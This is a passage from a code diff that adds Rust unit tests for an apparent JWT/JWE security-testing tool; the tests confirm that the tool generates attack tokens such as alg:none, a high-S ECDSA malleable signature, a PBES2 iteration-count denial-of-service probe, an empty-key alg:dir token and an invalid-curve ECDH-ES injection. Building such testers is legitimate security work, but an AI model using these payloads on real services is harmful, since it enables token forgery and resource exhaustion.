+            let h = get_header_from_token(p).expect("header");
+            assert_eq!(h.get("alg").unwrap().as_str().unwrap(), "none");
+        }
+    }
+
+    #[test]
+    fn test_ecdsa_high_s_malleability_produces_valid_signature() {
+        use openssl::bn::BigNum;
+        use openssl::ec::{EcGroup, EcKey};
+        use openssl::ecdsa::EcdsaSig;
+        use openssl::hash::{hash, MessageDigest};
+        use openssl::nid::Nid;
+
+        // Build an ES256 token signed with a fresh key (JWS raw r||s form).
+        let group = EcGroup::from_curve_name(Nid::X9_62_PRIME256V1).unwrap();
+        let key = EcKey::generate(&group).unwrap();
+        let header_b64 = URL_SAFE_NO_PAD.encode(br#"{"alg":"ES256","typ":"JWT"}"#);
+        let claims_b64 = "eyJzdWIiOiIxIn0";
+        let signing_input = format!("{header_b64}.{claims_b64}");
+        let digest = hash(MessageDigest::sha256(), signing_input.as_bytes()).unwrap();
+        let sig = EcdsaSig::sign(&digest, &key).unwrap();
+
+        fn pad32(mut v: Vec<u8>) -> Vec<u8> {
+            while v.len() < 32 {
+                v.insert(0, 0);
+            }
+            v
+        }
+        let mut raw = pad32(sig.r().to_vec());
+        raw.extend_from_slice(&pad32(sig.s().to_vec()));
+        let token = format!("{signing_input}.{}", URL_SAFE_NO_PAD.encode(&raw));
+
+        let payloads = generate_sig_malleability_payload(&token).unwrap();
+
+        // The high-S variant is 64 raw bytes, differs from the original, and
+        // must verify under OpenSSL (which does not enforce low-S).
+        let verified = payloads.iter().any(|p| {
+            let ps: Vec<&str> = p.split('.').collect();
+            if ps.len() != 3 {
+                return false;
+            }
+            let sb = match URL_SAFE_NO_PAD.decode(ps[2]) {
+                Ok(b) => b,
+                Err(_) => return false,
+            };
+            if sb.len() != 64 || sb == raw {
+                return false;
+            }
+            let rr = BigNum::from_slice(&sb[..32]).unwrap();
+            let ss = BigNum::from_slice(&sb[32..]).unwrap();
+            let esig = EcdsaSig::from_private_components(rr, ss).unwrap();
+            esig.verify(&digest, &key).unwrap_or(false)
+        });
+        assert!(
+            verified,
+            "high-S malleable signature should verify under OpenSSL"
+        );
+    }
+
+    #[test]
+    fn test_jwe_probe_covers_pbes2_dir_and_invalid_curve() {
+        let payloads = generate_jwe_probe_payload(DUMMY_TOKEN).expect("jwe ok");
+        assert!(!payloads.is_empty());
+
+        let mut saw_pbes2_dos = false;
+        let mut saw_dir_empty_ek = false;
+        let mut saw_invalid_curve = false;
+
+        for p in &payloads {
+            let segs: Vec<&str> = p.split('.').collect();
+            // The type-confusion variant is 3 segments; JWE probes are 5.
+            if segs.len() == 5 {
+                let hdr: Value =
+                    serde_json::from_slice(&URL_SAFE_NO_PAD.decode(segs[0]).expect("b64 header"))
+                        .expect("json header");
+                if hdr.get("alg").and_then(|a| a.as_str()) == Some("PBES2-HS256+A128KW")
+                    && hdr.get("p2c").and_then(|c| c.as_u64()) == Some(100_000_000)
+                {
+                    saw_pbes2_dos = true;
+                }
+                if hdr.get("alg").and_then(|a| a.as_str()) == Some("dir") && segs[1].is_empty() {
+                    saw_dir_empty_ek = true;
+                }
+                if hdr.get("epk").is_some()
+                    && hdr.get("alg").and_then(|a| a.as_str()) == Some("ECDH-ES")
+                {
+                    saw_invalid_curve = true;
+                }
+            }
+        }
+        assert!(saw_pbes2_dos, "expected PBES2 p2c=100000000 DoS probe");
+        assert!(
+            saw_dir_empty_ek,
+            "expected alg:dir with empty encrypted_key"
+        );
+        assert!(saw_invalid_curve, "expected ECDH-ES epk injection probe");
     }
 
     #[test]
